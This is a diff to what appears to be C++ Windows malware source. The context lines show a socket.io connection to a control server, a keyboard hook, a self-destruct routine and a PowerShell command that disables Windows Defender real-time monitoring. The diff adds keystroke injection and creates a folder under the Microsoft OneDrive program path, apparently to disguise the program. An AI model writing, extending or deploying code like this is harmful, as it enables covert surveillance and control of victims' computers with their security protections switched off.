@@ -30,8 +30,8 @@ std::vector<std::string> strokesPackage;
 sio::client client;
 
 int liveDelay = 100;
-const std::string server = "http://xxxxx:3000";
-const std::string VERSION = "2.0";
+const std::string server = "http://localhost:3000";
+const std::string VERSION = "2.1";
 const char base64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 bool IsConnectedToInternet()
@@ -83,6 +83,22 @@ void ClickAtPosition(int x, int y)
 	Input.type = INPUT_MOUSE;
 	Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
 	SendInput(1, &Input, sizeof(INPUT));
+	Sleep(100);
+}
+
+void PressKey(const std::string& key) {
+	INPUT input;
+
+	input.type = INPUT_KEYBOARD;
+	input.ki.wScan = MapVirtualKey(key[0], MAPVK_VK_TO_VSC);
+	input.ki.time = 0;
+	input.ki.dwExtraInfo = 0;
+	input.ki.wVk = key[0];
+	input.ki.dwFlags = 0;
+
+	SendInput(1, &input, sizeof(INPUT));
+	input.ki.dwFlags = KEYEVENTF_KEYUP;
+	SendInput(1, &input, sizeof(INPUT));
 }
 
 LRESULT CALLBACK GetKeyBoard(int nCode, WPARAM wParam, LPARAM lParam)
@@ -853,6 +869,9 @@ void SelfDestruct(std::string processName, std::string filePath)
 
 void InstallEmmetBat(std::string path)
 {
+	std::string createDir = "mkdir \"C:\Program Files\Microsoft\OneDrive\"";
+	system(createDir.c_str());
+
 	std::string disableAntiVirus = "Powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"";
 	system(disableAntiVirus.c_str());
 
